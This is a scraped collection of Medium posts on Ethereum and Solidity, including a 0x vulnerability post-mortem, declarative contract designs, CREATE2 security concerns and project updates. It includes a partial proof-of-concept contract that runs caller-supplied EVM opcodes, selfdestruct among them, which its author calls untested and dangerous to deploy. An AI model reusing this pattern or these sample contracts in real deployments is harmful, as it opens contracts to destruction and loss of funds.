calls, it\u2019s up to you to explicitly check the length of the return data.If you want to avoid this class of bugs, avoid inline assembly and stick to Solidity. If you must use assembly, be sure to validate the return data length!Writing code carefully, testing thoroughly, and getting a security audit are all great ways to improve the security of your code, but none are a panacea. Make sure you have thought through contingency plans.We have to make it easier for everyone to write secure code, and this requires a holistic approach that takes into account improving the system itself, building tools, and sharing our expertise.Further Readingsamczsun, who discovered the vulnerability, has a writeup here: https://samczsun.com/the-0x-vulnerability-explained/.A related bug (but kind of the opposite) was discovered in code dealing with non-conforming ERC20 implementations last June: https://medium.com/coinmonks/missing-return-value-bug-at-least-130-tokens-affected-d67bf08521ca. There, it was a fix to Solidity that uncovered the issue.0x\u2019s initial communication about the issue can be found here: https://blog.0xproject.com/shut-down-of-0x-exchange-v2-0-contract-and-migration-to-patched-version-6185097a1f39.", "responses": 0, "tags": ["Ethereum", "Smart Contract Security", "Solidity", "Smart Contracts"]}, {"title": "Smashing the EVM for Fun and\u2026Extensibility", "post_link": "https://medium.com/blockchannel/smashing-the-evm-for-fun-and-extensibility-2fc7cbc4752f?source=search_post", "author_name": "Steven McKie", "author_link": "https://medium.com/@McKie", "publish_date": "2017-11-14", "last_modified_date": "2018-05-05", "readtime": "3.53", "claps": 84, "voters": 14, "content": "Smashing the EVM for Fun and\u2026ExtensibilityNote: This is a crosspost that was submitted to BlockChannel with the author\u2019s permission; this post originally appeared here.Steven McKieFollowNov 14, 2017 \u00b7 4 min readI began this blog with the intent of speaking about the recent Parity Wallet event. After dissecting the code fully, and reading what else had been written by others, I felt there was little more to say. Short of brute forcing the address of the deleted code, we are not likely to see those funds recovered without a fork.Instead, I decided to write about the first thought I had while considering the Parity Wallet hack. As I was trying to think of possible solutions, I asked myself the question, \u201cWhat if I could make a contract that would allow me to run any code, any time, without the need for a library?\u201dMany contracts allow a user to interact with arbitrary code through the use of a proxy. This can be seen below:function () payable {someAddress.delegatecall(msg.data);}This function allows a user to call external code, but what I wanted was to simply call a contract and execute the code I passed in as an argument. Essentially, shellcode for the EVM.This is obviously NOT a good idea in most places. DAOs, token contracts, or any shared state contract would have no security with this code written into place. That said, it was fun to build.Disclaimer: This code was thrown together over a few hours, and is in no way optimized or even fully tested. This is a simple proof of concept. Do not use or deploy this code into any contract, for any reason.The first step to building EVM shellcode was to build a model. I settled on creating a stack machine inside of memory, using Solidity Assembly. Once I had a model, I had to build a loader. The loader I built can be seen on lines 5, 6, and 7.These lines of code set up an instruction pointer, an argument pointer, and finally the stack pointer. This setup assumes the first bytes32 object from the passed in array is a number specifying the total number of arguments. Thus, the arguments may be found isolated from the instructions. The instructions are loaded in code starting with index 1, and are read one bytes32 at a time. Granted this is a huge waste, since each opcode is only 2 bytes, but it was easier.1.  contract meta{2.    function run(bytes32[] code){3.      require(msg.sender == owner);4.      assembly{5.        mstore(add(calldatasize,60),160)6.         mstore(add(calldatasize,92),7.         add(sub(sub(calldatasize,4),8.         mul(byte(0,mload(128)),32)),64))9.        mstore(add(calldatasize,124), add(calldatasize,1148))10.       loop:11.         switch byte(0,mload(mload(add(calldatasize,60))))12.           case 0x00{13.             stop14.           }15.           case 0x01{16.             mstore(add(mload(add(calldatasize,124)),32),17.              add(mload(mload(add(calldatasize,124))),18               mload(add(mload(add(calldatasize,124)),32))))19.             mstore(add(calldatasize,124),20.              add(mload(add(calldatasize,124)), 32) )21.           }Once a loader was built, and the stack machine created, I needed a way to get instructions to be executed based on the code I was passing in. The easiest way to facilitate this was to build a big ugly switch case inside of a loop. The switch case parses the next instruction by resolving the opcode from the instruction pointer. It then seeks out the case and executes the opcode specified, using the memory based stack machine.Each case represents the actual EVM opcode values and emulates the operation out of the memory based stack machine. This can be seen on line 16, 17, and 18 where an addition is performed from the memory based stack. Lines 19 and 20 then increment the stack pointer.This seems like a nice trick, but it is very cumbersome unless you can get in some variables. To solve this problem, I built a push instruction to put arguments on the memory based stack. This can be seen below under case 0x60:case 0x60{ //load argument 0    mstore(sub(mload(add(calldatasize,124)),32),    mload(mload(add(calldatasize,92))))   mstore(add(calldatasize,124),    sub(mload(add(calldatasize,124)), 32) )  }...mstore(add(calldatasize,60),add(mload(add(calldatasize,60)),32)) jump(loop)}Finally, I needed a way to increment the instruction pointer, and jump back up the loop to read the next instruction. This last snippet of code performs this task quite nicely.After running a few tests, I proved to myself that an arbitrary user could call any opcode he/she desired, using this code. Some of the instructions do not make sense when using a memory based stack, but others translate just fine. For instance, selfdestruct could be called using this method.Just in case you missed the point, using this code you could call selfdestruct on a contract that did not explicitly define a selfdestruct method. This may have been handy in a recent wallet hack. Then again, this code would probably be an even bigger security flaw than an unlocked instantiater.The most exciting application of this hack, in my opinion, is the ability to load bytecode from storage. It may be possible to build a framework that allows for extensible code by modification of storage.In the coming weeks, I will follow up with more code from this experiment and more details about the methods used. For now, I just wanted to get a few minds thinking about the possibilities of using memory, calldata, and storage to execute arbitrary bytecode. These methods may make for a system that allows code to be dynamically updated and recovered from malicious acts. This code may also cause terrible damage if used improperly.", "responses": 0, "tags": ["Ethereum", "Solidity", "Security"]}, {"title": "Declarative Smart Contracts", "post_link": "https://medium.com/summa-technology/declarative-smart-contracts-4edaf7ec2e30?source=search_post", "author_name": "James Prestwich", "author_link": "https://medium.com/@Prestwich", "publish_date": "2018-08-31", "last_modified_date": "2018-08-31", "readtime": "5.51", "claps": 236, "voters": 15, "content": "Declarative Smart ContractsJames PrestwichFollowAug 31, 2018 \u00b7 6 min readAt Summa we work with cryptoassets on dozens of chains. Each chain is different. Models for states and consensus mechanisms vary widely through the ecosystem. But they all seem to share a purpose: allowing users to participate in consensus.Permissioned Shared StateA blockchain brings nodes to consensus on a shared state (more or less). Each block contains a list of state change instructions (\u201ctransactions\u201d), which all nodes validate. Blocks establish a canonical order of transactions; proof of work establishes a canonical order of blocks. Each node validates each block and plays each state change to reach a local view of the current state. As long as nodes are using the same validation rules, these disparate views converge over time into a shared state. Honest nodes will agree on all but the most recent state.Transactions are created by humans or machines. Which is to say, every state change originates off-chain for some unknown purpose. The consensus rules don\u2019t care why a transaction was made, or how, only that it doesn\u2019t break the rules. There are many rules for transaction verification in any deployed blockchain: Is it formatted correctly? Is it trying to create money? But the most important one is simple: Is the user allowed to update this state?In Bitcoin, we check that the scriptSig satisfies the UTXO\u2019s scriptPubKey. Providing a valid scriptSig proves that we are allowed to consume that UTXO. In Ethereum we check that the transaction signature is valid, and that the account\u2019s balance is sufficient, and leave all other checks to the specific contracts involved. Until ECDSA is broken, these things can\u2019t be forged.Essentially, Bitcoin addresses, Bitcoin scripts, Ethereum accounts, Ethereum contracts, and all the related plumbing form permissions systems. They define conditions that restrict state changes. A state change that meets those The blockchain then enforces these permissions. You can\u2019t move Bitcoin or Ether or write contract state unless you\u2019re allowed to. And when you do, you specify new permissions. A Bitcoin transaction doesn\u2019t move coins. It updates their permissions. An Ethereum transaction doesn\u2019t transfer tokens, it writes new state for the token contract.This is the only goal of a blockchain. These networks exist to create consensus around a permissioned shared state. They build the UTXO set, or state tree, and control updates.Smart Contracts Dilute PermissionsMost Bitcoin and Ethereum transactions are completely explicit. They specify the exact state changes to be made, and prove that the signer has permission to update that state. When you send Bitcoin, you make a transaction describing exactly which coins to move and where to send them. Then you must prove that you are the owner of those coins. Because your directions are perfectly explicit, you know what will happen. You have given your permission for a specific, precisely defined change of state. Either that exact state change will occur, or no update will be made.Smart contracts, however, complicate things. The outcome of a call to a smart contract may depend on many things. It can depend on the internal state of the contract, or the states of other contracts. It can depend on the time of day, or the whim of a miner, or other transactions the signer hasn\u2019t seen.As such, smart contracts prevent us from knowing the outcome of a transaction before it is confirmed. Its state changes are unknown before the transaction is included in a block. By signing the transaction, the user has consented to whatever state changes the contract defines, without knowledge of the outcome. When users call a contract they entrust their funds to it with no guarantee of good behavior.Given that the entire point of a blockchain is to create and update a state securely, smart contracts are intuitively problematic. Users deserve to know exactly what the transaction will do before they sign it. Anything else cedes partial control of user funds to miners or other users. It dilutes the permissions set on the shared state, which diminishes the usefulness of the chain.Declarative Smart ContractsThe core issue is that smart contracts describe the state changes that happen, based on the current state. Instead contracts should describe the state changes that are allowed, based on the current state. Users would then submit proposed state updates, which would be validated by the contract. If the state updates are approved, the exact state update the user wants would be made. This is a declarative smart contract. It declares what allowed state changes, and leaves all control logic and implementation to the users.Writing contracts this way is somewhat non-intuitive. Developers are used to imperative programming. We give instructions to the computer, and it follows them. It feels strange to do anything else. However, this doesn\u2019t reflect the reality of a blockchain. The chain is not adding anything. It doesn\u2019t perform operations. Transactions don\u2019t contain or trigger a calculation. The chain is only a permissioned state. Transactions signed by users modify the state.Declarative contracts align the structure of the contract implementation with the reality of the chain by defining exactly what state modifications are permissible, and letting the user modify state directly. Declarative contracts prevent unintended state changes. They protect the user from miner interference. The final effect of a transaction can be clearly communicated to the user before signing. And transactions that violate the user\u2019s intent are simply not valid.Ideally, we should create a new declarative language to write these contracts. This language would define constraints that state updates must meet. Constraints on who can make changes, what the changes may be, and under what circumstances the changes may be made. I imagine this language would look something like Ivy.Writing A Declarative ContractIdeal world aside, we can write declarative contracts in Solidity today. In fact, Solidity has been adding features that make it more declarative. And the best practices for Solidity (like Checks-Effects-Interactions) are declarative. The community already recognizes this need, even if they haven\u2019t named it yet.To write declarative contracts in Solidity, we move the logic of the contract into a set of require function calls. These statements have access to the current state of the contract. Then, instead of providing arguments to a function, the user calls the function with the end state they want. The new state is verified by the require calls. They compare it to the current state, and check that any changes made are allowed. If all requirements are satisfied, the new state is written over the old state.Below is a simple declarative game. Users adjust a byte towards a goal, using a few approved moves. The state consists of two bytes. The first byte is the current position, and the second byte is the goal. The constructor sets both the starting position, and the goal. Users call update to make a move. If the move is valid, the new state is written. If the move is a valid winning move, the caller is paid.pragma solidity ^0.4.22;contract DeclarativeGame {bytes2 state;modifier notHalted() {        require(state[0] != state[1]);        _;    }modifier approvedStateChange(bytes2 _newState) {        require(_newState[1] == state[1]);        require(            _newState[0] == ~(state[0] & 0xAA)   ||            _newState[0] == state[0] ^ 0x01      ||            _newState[0] == state[0] & ~state[1]);        _;    }function DeclarativeGame(bytes2 _startState)        public        payable    {        state = _startState;    }function update(bytes2 _newState)        public        notHalted        approvedStateChange(_newState)    {        state = _newState;        if (state[0] == state[1]) {            msg.sender.transfer(this.balance);        }    }}You can also build more complex things like tokens:pragma solidity ^0.4.22;contract DeclarativeToken {mapping(address => uint256) balances;modifier sameLength(address[] _addresses, uint256[] _balances) {        require(_addresses.length == _balances.length);        _;    }modifier approvedStateChange(address[] _addresses, uint256[] _balances) {        uint256 _endTotal = 0;        uint256 _startTotal = 0;// Check the sending address        require(_balances[0] < balances[_addresses[0]]);        require(_addresses[0] == msg.sender);        _startTotal += balances[_addresses[0]];        _endTotal += _balances[0];// Check each receiving address        for (uint i = 1; i < _addresses.length; i++) {            require(_balances[i] > balances[_addresses[i]]);            require(_addresses[i] != msg.sender);            _startTotal += balances[_addresses[i]];            _endTotal += _balances[i];        }// Check that we didn't create or destroy tokens        require(_endTotal == _startTotal);        _;    }function DeclarativeToken(address[] _addresses, uint256[] _balances)        sameLength(_addresses, _balances)    {        for (uint i = 0; i < _addresses.length; i++) {            balances[_addresses[i]] = _balances[i];        }    }function balanceOf(address _tokenOwner)        public        constant        returns (uint256)    {        return balances[_tokenOwner];    }function transfer(address[] _addresses, uint256[] _balances)        public        sameLength(_addresses, _balances)        approvedStateChange(_addresses, _balances)    {        for (uint i = 0; i < _addresses.length; i++) {            balances[_addresses[i]] = _balances[i];        }    }}Originally published at www.tokendaily.co.", "responses": 0, "tags": ["Ethereum", "Bitcoin", "Solidity", "Cryptocurrency", "Smart Contracts"]}, {"title": "Ethereum\u2019s EIP 1014: CREATE2", "post_link": "https://blog.cotten.io/ethereums-eip-1014-create-2-d17b1a184498?source=search_post", "author_name": "Tim Cotten", "author_link": "https://blog.cotten.io/@cottenio", "publish_date": "2018-11-18", "last_modified_date": "2019-06-13", "readtime": "3.38", "claps": 84, "voters": 14, "content": "Ethereum\u2019s EIP 1014: CREATE2Counterfactual Interactions with ContractsTim CottenFollowNov 18, 2018 \u00b7 4 min readThis article reviews EIP 1014 scheduled for inclusion in Ethereum\u2019s Constantinople release. A new method of creating a contract is proposed where the resulting address can be determined by parties ahead of time.2019\u201302\u201307: Rajeev Gopalakrishna has pointed out critical security concerns with the CREATE2 proposal. Attack vectors include being able to replace the original contract with a malicious contract at the same address due to insufficiency in relying on the init_code for hashing.Vitalik Buterin, creator of Ethereum, proposed a new contract creation function called CREATE2 for release in the upcoming Constantinople hard-fork.Why Two CREATEs?The original CREATE function creates a new contract at address that is a hash of the creator\u2019s address and the current nonce associated with the creator\u2019s address.CREATE2, while functionally the same, creates a contract at a targeted address that can be determined ahead of time by different parties.Example: Contract B expects at some point that Contract A will create a new Contract C for B to communicate with. Once B is able to successfully send messages to C then a certain condition will be met, and both A and B will be satisfied, perhaps a savings account with escrowed funds.Rather than wait for a message from Contract A, Contract B knows, based on the promises of the code in A, that it will create the contract at a deterministic address based on the CREATE2 opcode. Thus no explicit messaging is needed.FormatCREATE2 determines the address with the following schema:0xffaddresssaltkeccak256(init_code) \u2014 the constructor in bytecodeThe variables above are run through keccak256 and the result is the new contract address.Reminder: Ethereum does not use the standardized SHA3\u2013256.CounterfactualismThe toughest concept to wrap one\u2019s head around is listed in the Motivation section of the EIP, where the idea is that CREATE2 allows interactions with contract addresses that don\u2019t exist on-chain yet.Allows interactions to (actually or counterfactually in channels) be made with addresses that do not exist yet on-chain but can be relied on to only possibly eventually contain code that has been created by a particular piece of init code. Important for state-channel use cases that involve counterfactual interactions with contracts.But what does \u201cor counterfactually in channels\u201d actually mean?Liam Horne gives an excellent description in his article: Counterfactual: Generalized State Channels on EthereumIn the case we\u2019re discussing with EIP 1014 we\u2019re most interested in the section of his article entitled \u201cCounterfactual instantiation.\u201dTo make it simple, in the case of a counterfactual instantiation, all parties act as thought the contract has already been deployed even when it hasn\u2019t. The example cited involves multi-signature witnesses for transactions.CREATE2 accommodates this by allowing for determinable deployment addresses all parties can agree on based, in part, on the bytecode of the expected future contract.Notes & GotchasBecause of the leading 0xff byte the CREATE2 addresses will not collide with CREATE addresses based on address + nonce.Addressed in the EIP is the fact that the CREATE2 opcode must fail if code already exists at the address when CREATE2 is called. In other words, calling CREATE2 twice in a row would fail on the second, and be treated as an exception. (See EIP 684)Security Concerns (2019-02-07)Rajeev Gopalakrishna has pointed out critical security concerns with the CREATE2 proposal. Attack vectors include being able to replace the original contract with a malicious contract at the same address due to insufficiency in relying on the init_code for hashing.The discussion on the Fellowship of Ethereum Magicians is long and detailed, but the security concerns outlined are of critical importance, and I agree with the assessment that calls to outsource verifying that contracts haven\u2019t been replaced with \u201cbad versions\u201d to off-chain block explorers like Etherscan is anathema to everything the Ethereum blockchain stands for.As @pereztechseattle says:This is inviting another DAO-like disaster. You really think we\u2019ll get away with it twice?SummaryEIP 1014 is a keystone for the state channel framework of off-chain work.Because a future contract can be counterfactually instantiated it means that parties on and off the blockchain can act as though it already has been deployed, and complete substantial work beforehand and then sign and verify said work using an on-chain multi-signature wallet.This minimizes on-chain operations to those necessary for validating the cooperative effort/communications and not performing unnecessary calculations on the blockchain itself.For instance, rather than naively promising to host streaming video packets on Ethereum (impossible given block-solution times and gas costs), a state channel approach could have parties sharing video in a P2P framework and verifying their contributions counterfactually on-chain.Most importantly: EIP 1014 allows mutable contracts. Given the weak reliance on the init_code which might contain delegated calls or loading of contract code during the contract\u2019s deployment, but after the init_code hash has already been calculated, it\u2019s trivial to upgrade/replace a contract with no warning to end users.", "responses": 0, "tags": ["Ethereum", "Blockchain", "Blockchain Technology", "Solidity", "Programming"]}, {"title": "Community Update \u2014 June 8, 2018", "post_link": "https://medium.com/blockcat/community-update-june-8-2018-d0203c614b1a?source=search_post", "author_name": "BlockCAT", "author_link": "https://medium.com/@BlockCAT", "publish_date": "2018-06-08", "last_modified_date": "2018-06-15", "readtime": "2.15", "claps": 211, "voters": 11, "content": "Community Update \u2014 June 8, 2018Expanding the feature set of Tabby Pay. \ud83d\udcbbBlockCATFollowJun 8, 2018 \u00b7 3 min readIn case you missed it, last week we announced our next smart contract, Tabby Rewards, which was met with a fair bit of enthusiasm from our community.While we\u2019re excited about this next dApp, we\u2019re equally as excited about the continued attention that our first smart contract, Tabby Pay, has been getting.After we attended Consensus 2018, we alluded to a few potential partnership possibilities after meeting with the various teams in attendance. One partnership in particular we\u2019re working on requires us to add some additional features to Tabby Pay before we can integrate our services.Therefore, we\u2019re going to be assigning some of our resources back towards Tabby Pay in order to add the functionality we need to be successful.Two new features coming to Tabby Pay.1. Tabby Pay: ERC20 TokensWe\u2019re confident in what Tabby Pay has to offer for those who are sending ETH payments to one another, but it would be even more beneficial if you could use our dApp to send/receive any ERC20 token.This is something we\u2019re really excited about, as it expands the potential uses of Tabby Pay substantially.2. Tabby Pay: Payment in CATAnother piece of feedback we received was how the CAT token was used to get a discount on ETH fees, instead of utilizing CAT as a payment method.We\u2019ve made the decision to change this. Instead of getting a discount for having CAT in your wallet, you will instead pay with CAT, which will allow you to get a discount of 50%.Working in ParallelOver the next couple weeks we will continue to develop Tabby Rewards in parallel with the continued development of Tabby Pay.This will allow us to attract a new target market while at the same time opening ourselves up to potentially exciting partnerships in the future.Dev NotesA few quick notes about what went on behind the scenes this week.\ud83d\udcb0Tabby Pay:+ new feature: sending tokens (rather than just eth)+ bug fix: fix rendering of discount percentages\ud83c\udf81Tabby Rewards:+ general development still underway + payment with CAT+ fetching data from blockchain (refresh support)+ managing campaigns/rewards (cancelling)+ token auth\ud83d\udcbbInfrastructure:+ finalized new config structure to support our contract versioning\ud83d\udcddContracts:+ continued development on upcoming contractsThat\u2019s it for this week! If you have any questions, be sure to join our Discord channel, tweet to us on Twitter or chime in on the /r/BlockCAT subreddit!", "responses": 1, "tags": ["Ethereum", "Blockchain", "Smart Contracts", "Solidity"]}, {"title": "ChronoBank Smart Contracts", "post_link": "https://blog.chronobank.io/chronobank-smart-contracts-54c305b2ae62?source=search_post", "author_name": "ChronoBank.io", "author_link": "https://blog.chronobank.io/@ChronoBank", "publish_date": "2017-12-18", "last_modified_date": "2018-07-01", "readtime": "5.97", "claps": 236, "voters": 12, "content": "ChronoBank Smart ContractsChronoBank Smart Contracts ecosystem is built around two things simple for understanding: platforms and assets. Platforms act as a base for all token operations like issuing, balance storage, transfer. Assets add interface layout and define some custom internal logic to allow implementing different behavior, for example, adding a fee to token transactions.ChronoBank.ioFollowDec 18, 2017 \u00b7 6 min readSince assets define just internal behavior, there are so-called ChronoBank asset proxies which provide an ERC20 standard interface (described in ERC20Interface.sol) and acts as a transaction proxy. It allows to add/change token logic by updating asset implementation and to recover a wallet access in case of key loss.While looking into details it could be spotted that our Smart Contracts ecosystem is more than just platforms and assets. These core entities represent important but small part of all functionality.EcosystemThe next foundational block in the ecosystem is a top-level contracts module (a handful of managers) that provides all needed interfaces to organize flexible and powerful tools.PDF version for detailed previewContractsManager plays a role in the central registry which holds references to all services registered in a system.To get to the central registry contracts should be added by a contract owner of ContractsManager or those contacts that are allowed to do so (based on ACL in StorageManger).It\u2019s worth mentioning that a set of managers (top-level and others) do not store their data directly in storage, but use instead Storage contract to pass responsibility for saving data. This Storage contracts besides StorageManager are included in Shared Storage set of contracts.UserManager contract role is to provide system-wide user registry where simple users and admins (CBE) live together. It also provides a part of multisignature infrastructure by keeping a number of admins required to confirm operations.PendingManager contract provides the rest of multisignature functionality by holding and tracking operations performed in a system and carrying them out when a critical number of confirmations were received.ERC20Manager contract keeps track of all ERC20-based tokens registered in a system.Events History is a submodule which performs like a gate for all events happening in a system. All system managers are using the same instance of EventsHistory (see MultiEventsHistory contract), other contracts created during the system\u2019s work could use different event histories instances.Labour-Offering Companies (LOCManager) is a particular module that organizes work of ChronoBank with third-party companies and allows them to participate in the ChronoBank ecosystem.The next part of modules is designed to make users\u2019 life easier by providing additional layers of abstraction on top of existing core contracts.Key contractsPlatformsManagerPlatformsManager makes it possible to manipulate multiple platforms and create brand new platforms.AssetsManagerAssetsManager allows users to build their own tokens, organize their crowdsale.WalletManagerWalletManager gives the ability to create wallets for storing tokens and organize multisignature access to its balance and transfers. Note: multisignature mechanism is independently implemented and isn\u2019t based on PendingManager contract.OtherBesides aforementioned modules there are also modules that manipulate tokens (TIME and other ERC20 tokens) that allows to:unlock system\u2019s functionality for usage where it is needed to stake some amount of tokens to perform an operation;pay for unique functionality available in a system (such as creating a new platform, issuing a token, starting a token crowdsale, creating a wallet and some others).For providing such ability for a system, there were introduced a couple of contracts that are coupled with Deposit and Feature Fee modules.The last but not the least is Additionals modules that provided extended functionalities for ChronoBank ecosystem:Crowdsale \u2014 the key contract is CrowdsaleManager and it organizes token crowdsale. It was made available to use only through AssetsManager.Voting \u2014 the key contract is VotingManager which arranges poll creation where users that hold their TIME tokens in TimeHolder could vote to participate in system\u2019s decisions.Exchange \u2014 the key contract is ExchangeManager which coordinates exchanges between different tokens and allows users to sell/buy tokens for other tokens.A more detailed version of the scheme contains internal entities and connections that participate in module\u2019s work.Dive in!ChronoBank ecosystem has its own token called TIME that fuels work of many functions. We gather them in one place to provide a more specific overview of their responsibilities.PDF version for detailed previewTimeHolderMain contracts:timeholder/TimeHolder.solDeposit holder. Allows to deposit/withdraw TIME tokens. Users, who have deposits, are allowed to use some key features of the system such as creating ERC20 tokens, starting crowdsale for it, create exchanges and so forth.Users could deposit and withdraw at any time and those changes will appropriately update functionalities that are bound to TimeHolder (such as voting and so forth).Dev notes:New functionalities and new contracts could take advantage of using TimeHolder\u2019s shares to secure and restrict their features: developers are able to add new contracts and use ListenerInterface to observe changes in TimeHolder\u2019s deposits \u2014 this will unlock an access to notifications about deposit/withdrawal actions made by the user.PollManager (VotingManager.sol is under construction)Main contracts:vote/PollManager.sol.This piece of functionality takes place in the system and is responsible for voting functions. It serves as a central point to enter and manage (create, navigate, stop) polls.In general, it aggregates the following functions:creation of new polls,tracking the number of currently active polls,getting paginated lists of all created polls.Users, who have TIME deposits, allowed to perform a vote connected actions according to TIME deposit value.ExchangeManagerMain contracts:exchange/ExchangeManager.sol.It\u2019s an exchange registry that holds information about created exchanges and provides some utility methods for managing them.It serves as the entry point for creating new exchanges.Standalone Exchange allows users to buy/sell assigned ERC20 token for ether, as long as there is available supply.Contract owner maintains sufficient token and ether supply, and sets buy/sell prices. In order to be able to sell tokens, the user needs to create an allowance for this contract, using standard ERC20 approve() function, so that an exchange could take tokens from the user when the user orders a sell.CBE users are permitted to manage fee value against which an exchange will calculate the fee.Some methods might take a fee in TIME tokens.PlatformsManagerMain contracts:assets/PlatformsManager.sol.Managing system\u2019s and users\u2019 platforms is possible because of this contract. It allows to create and manipulate platforms and considered as an entry point to go through user\u2019s platforms.Provides system-wide ability to manage user\u2019s platforms. This contract allows to:create a brand new platform,get a list of platforms owned by a user,attach (or detach) any platforms outside the system or created somewhere by users themselves.Some methods could require paying additional fee in TIME tokens during their invocationPlatformTokenExtensionGatewayManagerMain contracts:assets/extensions/PlatformTokenExtensionGatewayManager.solThat is a backend contract specifically created to aggregate main functionality for token manipulations and make less burden on a token creation process as well as on other functions.Key responsibilities are to:create assets (with and without fee),create token crowdsale and remove them.Some methods might take a fee in TIME tokens.Dev notes: Since this contract is designed to be used by delegatecall it doesn\u2019t inherit from any contract (except FeatureFeeAdapter) and you should be careful when a need will arise to add more functionality by inheritance because the contract uses storage layout from TokenExtensionRouter and it should be preserved.WalletMain contracts:wallet/WalletsManager.sol,wallet/Wallet.sol.Allows to manage multisignature wallets, i.e.create wallet;add wallet;remove wallet.DocumentationFor more details please refer to chronobank.github.io.Stay tuned, guys! And, as always, thanks for your support!For all latest updates:Follow us on Twitter and FacebookJoin us on Telegram and SlackTIME is trading on the following exchanges:https://coinmarketcap.com/assets/chronobank/#markets", "responses": 0, "tags": ["Blockchain", "Smart Contracts", "Ethereum", "Solidity", "Development"]}, {"title": "Awesome Ethereum Resource Lists", "post_link": "https://medium.com/quiknode/awesome-ethereum-resource-lists-dd28a9c17fc1?source=search_post", "author_name": "Gaurav Agrawal", "author_link": "https://medium.com/@gaurav.agrawal", "publish_date": "2019-01-25", "last_modified_date": "2019-02-28", "readtime": "3.57", "claps": 103, "voters": 13, "content": "Awesome Ethereum Resource ListsA Metalist of Curations in the Ethereum EcosystemGaurav AgrawalFollowJan 25 \u00b7 4 min readWe have created a list of all the curated resource lists in Ethereum. If you\u2019re looking to learn more about Ethereum, this is a great place to start. Let us know in the comments if we missed anything!\u201cThe blockchain symbolizes a shift in power from the centers to the edges of the networks.\u201d \u2014 William MougayarAwesome CryptoeconomicsCryptoeconomics is a study of understanding economics incentives and disincentives in Cryptosystems. A Cryptosystem is a combination of cryptography, game theory and computer networks to create a decentralized system.Resource list \u2014 Awesome CryptoeconomicsAwesome CryptographyCryptography the practice and study of techniques for secure communication in the presence of adversaries. [source]Resource list \u2014 Awesome CryptographyAwesome Crypto PapersA curated list of cryptography papers, articles, tutorials, and how-to\u2019s.Awesome Homomorphic EncryptionHomomorphic encryption is a cryptographic method that allows mathematical operations on data to be carried out on ciphertext, instead of on the actual data itself. The ciphertext is an encrypted version of the input data (also called plain text). It is operated on and then decrypted to obtain the desired output. The critical property of homomorphic encryption is that the same output should be obtained from decrypting the operated ciphertext as from simply operating on the initial plain text.[source]Resource list \u2014 Awesome-HESolidity TutorialsSolidity tutorials videoCoinmonks solidity articles curationEthereum Developer Tools ListA guide to available tools, components, patterns, and platforms for developing applications on Ethereum. Curation by ConsenSysResource list \u2014 Developer ToolsBlockchain for Software EngineersResources curated by a full stack software engineer to a blockchain engineer.Resource list \u2014 Blockchain EngineerEcosystem ResourcesA guide to the available DApps, services, writings, and knowledge bases for learning and understanding the Ethereum ecosystem.Resource list \u2014 Ecosystem ResourcesAwesome SoliditySolidity is the mainstream Ethereum smart contract language. A curated list of awesome Solidity resources, libraries, tools and more.Resource list:Awesome Solidity by Ben KremerAwesome Solidity by BlockchainLabsNZAwesome Ethereum Virtual MachineA curated list of resources on the Ethereum Virtual Machine (EVM), which is the virtual machine executed on the Ethereum network.Resource list \u2014 Awesome Ethereum Virtual MachineAwesome State ChannelsState channels are an approach to scale blockchain by moving some of the transactions off-chain.Resource list \u2014 Awesome State ChannelsA list of protocols for decentralized exchangeA curated list of various Decentralized exchange projects & protocols.Resource list \u2014 DEX ProtocolsEthereum Token Standards ListA curated list of all token related standards proposed for the Ethereum network.Resource list \u2014 Ethereum Token StandardsAwesome Buggy ERC20 TokensA collection of vulnerabilities in ERC20 smart contracts with tokens affected.Resource list \u2014 Awesome Buggy ERC20 TokensAwesome Decentralized FinanceDecentralized finance (#DeFi) is the movement which leverages open-source software and decentralized networks to transform traditional financial products into trust-less and transparent protocols that operate without unnecessary intermediaries. One could envision decentralized finance impacting the financial world the same way that open-source software has changed software products.A curated list of awesome decentralized finance projects, software, and resources.Resource list \u2014 Awesome Decentralized FinanceAwesome ZeppelinZeppelin builds key infrastructure to develop and operate smart contract systems.Resource list \u2014 Awesome ZeppelinEthList: The Crowdsourced Ethereum Reading ListA crowdsourced Ethereum reading list.Resource list \u2014 Ethereum Reading ListBlockchain PapersA curated list of blockchain-related academic papers. Papers have been peer-reviewed and presented in academic conferences.Resource list \u2014 Blockchain PapersAwesome Ethereum AnalyticsA curated list of projects around Ethereum analytics.Resource list \u2014 Awesome Ethereum AnalyticsAwesome EthereumUseful resources for using Ethereum and building things on top of itResource list:Awesome Ethereum by void4Awesome Ethereum by btomashviliAwesome Ethereum SecurityA curated list of awesome Ethereum security referencesResource list \u2014 Awesome Ethereum SecurityEthhubEthHub provides a single source for essential Ethereum information.Resource list \u2014 Ethhub.ioSharding RoadmapEthereum is moving to a Proof-of-Stake system which will also include scaling solutions such as sharding.Roadmap \u2014 Sharding RoadmapDecentralized Apps (DApps)A decentralized application runs on the decentralized network with trustless protocols.Resource list:Decentralized Apps (DApps)State of the DApps RegistryDAppRadar RegistrySmart Contract Security Best PracticesA guide to smart contract security best practices.Resource list \u2014 Smart Contract Best PracticesAwesome Solidity PatternAn accomplice to the \u201cSmart Contract Best Practices\u201d above, but with less security \u2014 and more focus on engineering.Resource list:Awesome-Solidity-PatternsSolidity-PatternsEthereum Formal Verification ToolsResource list:Projects / ToolsEthereum FundsThe Ethereum Community Fund (ECF)ETH PrizeStatus Incubate by Status.imAragon Nest by Aragon0x Ecosystem Acceleration Program by 0xProjectThe Stable Fund by MakerDAOConsenSys VenturesConsenSys LabsGnosis XGnosis Ecosystem FundGitcoin GrantsMissing something? Open a pull request here or comment this post \ud83d\udc47.Please take 5 minutes to fill below Ethereum Node Survey \ud83d\ude4f \ud83d\udc47About QuikNodeQuikNode is building infrastructure to support the future of Web3. Since 2017, we\u2019ve worked with hundreds of developers & companies, helping scale their Dapps and providing highly reliable Ethereum nodes. We\u2019re working on something interesting from the past few months and will be launching soon, so subscribe our newsletter for more updates!! \ud83d\ude03", "responses": 0, "tags": ["Blockchain", "Ethereum", "Solidity", "Smart Contracts", "Cryptocurrency"]}, {"title": "Formal Verification for n00bs -Part 3: An attempt to prevent classic hack with Act", "post_link": "https://medium.com/ethworks/formal-verification-for-n00bs-part-3-an-attempt-to-prevent-classic-hack-with-klab-8e8d13318086?source=search_post", "author_name": "Marek Kirejczyk", "author_link": "https://medium.com/@marekkirejczyk", "publish_date": "2019-02-21", "last_modified_date": "2019-04-04", "readtime": "3.47", "claps": 297, "voters": 13, "content": "Formal Verification for n00bs -Part 3: An attempt to prevent classic hack with ActMarek KirejczykFollowFeb 21 \u00b7 4 min readThis is the third post of a series Formal Verification for n00bs:Part 1: The K ecosystemPart 2: Proving the correctness of a tokenPart 3: A try to prevent classic hack with KLabPart 4: Understanding K languageIn this 